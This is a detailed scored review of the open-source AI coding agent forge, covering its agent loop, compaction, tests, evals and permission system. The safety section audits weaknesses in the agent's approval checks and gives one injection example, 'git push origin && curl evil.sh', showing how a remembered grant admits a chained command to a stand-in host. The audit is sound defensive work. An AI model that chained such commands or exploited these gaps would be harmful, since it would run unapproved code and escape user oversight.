# forge (antinomyhq/forge → tailcallhq/forgecode) — T2 deep review

Anchor question. Closest anchor is **crush**: same overall shape (institutionally-backed Rust
agent with loop detection, offline eval-ish harness, MCP client but no SDK/ACP, permission
machinery with nothing under it) -- except forge's compaction and loop-spec verification are
pi-tier while its approval *default* (allow-all) is worse than crush's always-on permission
service, which nets it between the crush (69.0) and cline (76.5) rungs, nearer crush's band
shape than cline's SDK-first architecture.

Subject identity: /data/samples/agents/forge, remote origin =
https://github.com/antinomyhq/forge, which redirects to tailcallhq/forgecode (GitHub API:
"forgecode", org tailcallhq, 7,637 stars, 1,462 forks, pushed_at 2026-09-29, license
apache-2.0). This is Forge for Code (forgecode.dev), NOT the corpus's forge-norvialabs
(NorviaLabs/forge, MIT, different project; name-similarity check done, no shared lineage:
crate names, templates, and README assets are all forgecode/tailcall/antinomy). Shallow
clone (.git/shallow, HEAD 1d4fb7c).

## Census sanity

- **test_loc 5,176 is badly wrong.** Tests live in inline `#[cfg(test)]` modules: ~62.0k LOC
  across 243 of 474 .rs files (measured by slicing each file from its first `#[cfg(test)]`),
  plus ~1.9k LOC in `crates/*/tests/*.rs`. Test-fn count: 2,287 `#[test]` + 391
  `#[tokio::test]`. Census non_test_loc 131,658 ~= total .rs wc (134,390), i.e. inline tests
  were counted as production. Same glob-miss pattern as crush/cline anchor artifacts. Real
  split is roughly 72k non-test / 64k test. Tier T2 still holds on total LOC (~134k).
- contributors:1 / commits:1 = shallow-clone artifact. Upstream is active daily (pushed
  2026-09-29, org CI on every PR). No archived/dead reading possible.
- license: "Apache-2.0 (file); ISC (manifest)" -- LICENSE is Apache-2.0 and GitHub agrees;
  the ISC is the private npm wrapper `package.json` (name "forge-code-evals", `"private":
  true`) used only for the TS benchmarks harness. Canonical license Apache-2.0, permissive;
  no clean-room constraint. Mismatch logged as a low finding (manifest identity).

## What I read (T2 mandatory surfaces)

Core loop: `crates/forge_app/src/app.rs:60-206` (chat pipeline: system/user prompt
generation, hooks wiring, orchestrator spawn, conversation always saved post-dispatch) and
`crates/forge_app/src/orch.rs` (467 LOC). Loop is `while !should_yield` at orch.rs:274: each
iteration fires Request hook, runs `execute_chat_turn` under `retry_with_config` (orch.rs:285,
RetryAttempt surfaced to UI), computes `is_complete` on Stop+no tool calls, executes tool
calls (orch.rs:56-167: Task/agent calls fanned out in parallel via `join_all`, system tools
sequential behind a UI-notifier handshake), appends results, tracks per-tool failure budget
`ToolErrorTracker` (orch.rs:339-356 -- injects a rendered "attempts_left" reflection template
into each error output) and interrupts at `max_tool_failure_per_turn` (orch.rs:360-369) or
`max_requests_per_turn` (orch.rs:399-414). Context re-synced from conversation after every
hook pass; conversation persisted to sqlite each iteration (orch.rs:277, :382). End-hook can
append messages and un-yield the loop (orch.rs:424-441) -- that is how PendingTodosHandler
nudges. State model: single Conversation value owned by the orchestrator; hooks mutate it
through a lifecycle (Start/Request/Response/ToolcallStart/ToolcallEnd/End) -- clean, tested.

Compaction: `crates/forge_app/src/compact.rs` (936 LOC) + `transformers/compaction.rs` +
`transformers/trim_context_summary.rs` + `hooks/compaction.rs` +
`forge_domain/src/compact/compact_config.rs`. The striking fact: **compaction makes no LLM
call anywhere** (grep for chat/provider in `forge_domain/src/compact/*` and compact.rs: zero;
the `compact.model` config knob exists but compaction itself is mechanical). Strategy =
evict(0.2 default, compact_config.rs:123) min retain window
(compact.rs:41-57); the evicted assistant sequence is folded into a mechanical
ContextSummary, then a transformer pipeline (drop system role, dedupe consecutive user
messages, TrimContextSummary = keep only the last operation per resource keyed by
operation-kind -- File/Shell/Search/Fetch/etc., trim_context_summary.rs:14-60, strip cwd)
renders it through `forge-partial-summary-frame.md`. Two genuinely careful details:
(1) reasoning-chain continuity -- the LAST `reasoning_details` of the compacted range is
carried into the first surviving assistant message so Anthropic thinking-block chains don't
break after compaction, with a comment explaining why extracting the last (not first)
prevents exponential accumulation across compactions (compact.rs:109-172, property-tested at
compact.rs:182-240); (2) usage accumulation -- token usage of destroyed messages is summed
onto the summary entry (compact.rs:136-152) so cost accounting survives compaction. Trigger
is four-way (tokens / turns / messages / turn-end, compact_config.rs:131-135), token count
is exact-from-usage when available with char-estimate fallback
(forge_domain/src/context.rs:618-637). Manual `/compact` path in app.rs:210-274. No
projection of what the *model would receive* (pi's projected-context trigger is stronger);
window ratios rather than projection place it at pi-8 minus one wrinkle, but determinism and
reasoning carry-over are things pi/codex don't do.

Permissions/safety: `crates/forge_services/src/policy.rs` (446) +
`forge_domain/src/policies/` (1,024: config/engine/operation/policy/rule/types) +
`permissions.default.yaml` + enforcement point in
`crates/forge_app/src/tool_registry.rs:141-156`. The engine is a real declarative policy
layer: Allow/Deny/Confirm over glob rules for read/write/execute/fetch, composable with
All/Any/Not boolean logic (policy.rs:11-68), first Deny/Confirm short-circuits, engine
defaults to Confirm when no policies exist (engine.rs:28-57) -- all unit-tested
(engine.rs:84-205, rule.rs:249+). But three things gut it in practice:
1. The check only runs when `config.restricted` is true
   (tool_registry.rs:144-145), and `restricted` is `#[serde(default)]` = false
   (forge_config/src/config.rs:266-269); grep shows no other way to enable it -- no CLI
   flag, no mention in README/docs.
2. First-run `init_policies` writes `permissions.default.yaml` which is allow-all:
   `read "**/*", write "**/*", command "*", url "*"` (permissions.default.yaml:1-12,
   embedded via policy.rs:35-38). So even with restricted=true on a fresh install, every
   operation matches an Allow rule and Confirm never fires.
3. Command rules are whole-string globs (rule.rs:102-108 `glob::Pattern::matches` over the
   full command), so an "Accept and Remember" grant for `git push` stores `git push*`
   (policy.rs:236-244) which also admits `git push origin && curl evil.sh` -- shell
   metacharacters are not modeled. Write grants are stored as `*.ext` everywhere (policy.rs:
   210-218) -- accepting one .rs edit permanently allows all .rs writes system-wide.
No OS sandbox of any kind: shell goes through bare `tokio::process::Command`
(forge_infra/src/executor.rs:9,38). The `--sandbox <dir>` flag is a git-worktree isolation
feature: `Sandbox::create` makes/reuses a worktree sibling dir and runs there
(forge_main/src/sandbox.rs:11-141, main.rs:111-115, cli.rs:51). Useful, but the flag name
suggests a security boundary that does not exist; enforcement is "nothing underneath" and
the default is not even approval-on-top. This is below the nanocoder-5 rung (which at least
approves by default) -- 4.

## Verification

- ~64k test LOC / 2,678 test fns; 67 files use insta snapshots; fixtures via a dedicated
  forge_test_kit crate.
- **Loop semantics are specced**: `crates/forge_app/src/orch_spec/` (1,245 LOC) drives the
  real Orchestrator with scripted `ChatCompletionMessage` sequences through a TestContext
  harness (orch_runner.rs:66 `test_completions: Mutex<VecDeque<...>>`) and asserts loop
  properties: history persistence, followup-yields-without-TaskComplete, user-message
  rendering, tool-error handling (orch_spec.rs:10+). This is the faux-provider-testing
  pattern at the crush/pi level, minus scripted-provider fault injection breadth.
- forge_json_repair has 11 dedicated edge-case test files (truncation, escaping, unicode
  quotes) -- real property-shaped coverage of the JSON-repair path, though no fuzzing.
- Doom-loop detector is pattern-tested including n-gram cycles (doom_loop.rs:253+, tests
  from :293).
- CI (`.github/workflows/ci.yml`, itself generated from Rust build.rs via gh-workflow-gen):
  llvm-cov on every PR (ci.yml:56), a *performance budget* job -- `benchmark.sh --threshold
  60 zsh rprompt` (ci.yml:73-74), 9-target cross-release matrix, autofix lint workflow.
  Coverage is produced but no threshold gate visible.
- **Real eval infrastructure exists but is offline**: `benchmarks/` is a TS harness
  (`npm run eval`, package.json scripts) running 14 behavioral eval suites
  (benchmarks/evals/: patch_exact_match, multi_file_patch, parallel_tool_calls,
  read_over_cat, search_over_find, refactoring_uses_patch, redundant_cd_with_cwd,
  commit_no_markdown, sem_search, todo_write_usage, create_skill, suggest, echo,
  semantic_search_quality). Method is genuinely good: each task drives the real CLI with
  `FORGE_DEBUG_REQUESTS={{dir}}/context.json`, then jq assertions on the dumped request
  verify *behavior* ("used patch tool", "no patch failures from missing search match")
  (patch_exact_match/task.yml:194-198); model matrix per task (claude-sonnet-4.5,
  glm-4.6:exacto, minimax-m2.1), CSV-sourced task fan-out, per-eval parallelism/timeout/
  early_exit. ci.yml envs carry OPENROUTER_API_KEY (ci.yml:21) but **no workflow job runs
  the evals** -- convergence with deepagents-10 (harness wired only to manual invocation).
  Per the anchors errata, no in-CI evals + no fuzzing = verification caps at 8; forge sits
  at 8 because the offline harness is real and the CI-side test corpus is property-shaped,
  not merely existence-shaped.

## Safety enforcement summary

Score 4: real, tested declarative policy engine + read-before-edit enforcement
(tool_executor.rs:46-65, applied :349-363 to patch/multipatch/overwrite-write) + permission
check placed before tool timeout deliberately (tool_registry.rs:141-143 comment) -- but
opt-in gate that is undocumented at code level, allow-all file written on first run,
whole-string glob command matching that remembers dangerously broad grants, zero OS
sandboxing, and a `--sandbox` flag whose name promises isolation it does not provide.

## Orchestration

Subagents as tools with ordered parallel fan-out (orch.rs:62-90 partition + join_all, results
re-sequenced to original order; agent_executor.rs:37-143 re-enters ForgeApp.chat for a nested
conversation, with explicit "AGENTIC tool" error context on interrupt); agents themselves are
exposed as tools (agent_executor.rs:27-35). Budgets: max_requests_per_turn,
max_tool_failure_per_turn, per-tool-type timeouts (tool_registry call_with_timeout), retry
config with backoff + UI events. Doom-loop detector on Request hook injects a
`<system_reminder>` template rather than hard-stopping (doom_loop.rs:220-245) -- soft
breaker. `forge data` (cli.rs:136-137): JSONL batch processing through schema-constrained
tools -- a small workflow plane. No queue/daemon, no crash-recovery journal beyond the
per-iteration sqlite persistence (which does make mid-turn resume possible via
`forge conversation resume/clone/retry`, cli.rs:719-795). crush/pi rung: 7.

## Interop

MCP client (forge_services/src/mcp/ manager/service/tool + `forge mcp` CRUD with porcelain
output, cli.rs:117); gRPC API surface (tonic, forge_api crate + protobuf); headless `-p`
prompt + piped stdin (cli.rs:16-27) and `--porcelain` machine-readable output threaded
through ~15 subcommands; zsh plugin as a first-class ambient surface (`:` prefix, rprompt
model/cost display, forge.setup.zsh/forge.theme.zsh/keyboard.zsh) with a CI perf budget;
VS Code integration is only extension-install detection (forge_main/src/vscode.rs:9-55),
not a protocol surface. No ACP, no MCP-server mode, no published SDK. crush-7 rung: 7.

## Operability

Conversations in sqlite with diesel migrations and indexes (forge_repo/src/database/
migrations/, conversations table + metrics), resume/clone/retry/stats/last/details/
export(JSON|HTML)/compact as first-class CLI (cli.rs:719-795); per-file undo service
(FsUndoService wired in tool_executor.rs; fs_snap in forge_repo); diagnostics: `forge info`
porcelain, `forge logs` streaming, `forge doctor` shell-env check, auto-dump of
conversation on completion (forge_config/src/auto_dump.rs, FORGE_DEBUG_REQUESTS); self-update
(update.rs) with 9-platform release matrix; config reference generated as forge.schema.json
with drift-gate test (forge_config/tests/schema.rs). No checkpoint-of-whole-workspace
revert (undo is per-file), no visible crash-recovery posture statement. crush-8 rung: 8.

## Originality

- LLM-free deterministic compaction with operation-kind-aware fold, reasoning-chain carry,
  and cost-accounting continuity across the fold (compact.rs:109-172) -- no anchor does the
  last-reasoning extraction trick; closest is codex's token-budget fresh-window tier.
- SetCache marker-stability transformer: cache every system message, exactly one rolling
  message marker, first-message fallback, tested (set_cache.rs:1-55 + tests) -- converging
  with prompt-cache-marking.
- FORGE_DEBUG_REQUESTS + jq behavioral assertions on request dumps as the eval verification
  trick -- cheap, provider-agnostic, and it makes assertions about tool *usage policy*
  rather than output text.
- Doom-loop n-gram pattern detection (converges with loop-detection).
- zsh-native agent mode with a CI-enforced 60-unit rprompt perf budget -- perf budgets on
  shell prompt cost are unique in the corpus so far.
- `forge data` JSONL-to-schema'd-tools pipeline.
7 -- distinctive mechanisms, none field-defining.

## Durability

Org-backed (tailcall/antinomy), CLA, renovate, generated workflows, bounty workflow syncing
issues/PRs to bounties (.github/workflows/bounty.yml), active daily pushes, 7.6k stars.
Single-vision org rather than broad contributor base. crush-8 rung: 8.

## Docs/DX

One-command curl install; README is exhaustive (three modes, zsh plugin reference, config
guide) but in-repo docs are near-zero (`docs/` = tool-guidelines.md only); `plans/` holds
20+ dated design docs (useful but not user docs); generated config schema with drift test;
rich `--help` with doc comments everywhere. codex-7 shape (external-pointer docs) vs crush-6
(docs thin): README quality pushes to 6.5, keeping 6 given the docs/ emptiness and no
SECURITY.md.

## Scores

| dimension | score | best evidence |
|---|---|---|
| architecture | 7.5 | 25-crate split, loop isolated (orch.rs:245-467), transformer/hook architecture; docked: forge_app/src/utils.rs 2,881 LOC display grab-bag, operation.rs 2,652 LOC, tool_registry.rs 1,115 |
| verification | 8 | orch_spec loop specs (orch_spec.rs:10+, orch_runner.rs:66); 2,678 test fns; json_repair edge suites; llvm-cov PR gate (ci.yml:56); rprompt perf budget (ci.yml:73); evals offline (8 ceiling per errata) |
| safety-enforcement | 4 | tool_registry.rs:144-145 restricted-gated check; config.rs:269 default false; permissions.default.yaml:1-12 allow-all; rule.rs:102-108 whole-string glob; executor.rs:9,38 bare Command; sandbox.rs:11 worktree-named-as-sandbox |
| token-economy | 8 | compact.rs:41-57,109-172 (LLM-free, reasoning carry, usage retention); set_cache.rs:1-55; tool_executor.rs:67-110 spillover temp files; context.rs:618-637 exact/estimate token counts |
| orchestration | 7 | orch.rs:62-90 parallel agent fan-out; error tracker orch.rs:339-369; doom_loop.rs:81+; per-iteration sqlite persistence; no queue/journal |
| interop | 7 | MCP client (forge_services/src/mcp/), gRPC forge_api, porcelain headless (cli.rs:103 etc.), zsh plugin; no ACP/SDK; vscode.rs is install-only |
| operability | 8 | conversation resume/clone/retry/export/compact (cli.rs:719-795); migrations; doctor/logs/info; schema drift test (forge_config/tests/schema.rs); per-file undo |
| originality | 7 | compact.rs:124-172 reasoning carry; task.yml:194-198 jq-on-dump evals; ci.yml:73 perf budget; `forge data`; All/Any/Not policy DSL (policy.rs:11-24) |
| durability | 8 | org-backed, pushed 2026-09-29 (remote-verified), CLA+renovate, 9-target releases, bounty workflow |
| docs-dx | 6 | README-only docs, docs/ has one file; generated schema; no SECURITY.md |

Weighted total: 7.5*15 + 8*15 + 4*10 + 8*10 + 7*10 + 7*10 + 8*10 + 7*10 + 8*5 + 6*5 = 712.5 →
**71.25 → Band B**. Strongest dimension: verification (tied with token-economy at 8;
verification carries the heavier weight). Weakest dimension: safety-enforcement (4).

Band shape note: if anything, the safety 4 is the most consequential number -- the policy
engine is good engineering that is switched off by default and initialized to permit
everything; the gap between what exists (tested engine, boolean policy DSL, scoped grants)
and what binds (nothing, until the user hand-edits YAML they were never told about) is the
single largest fixable delta in this subject.

Boundary risk: 71.25 is >2 pts from 65/78 -- no boundary flag.
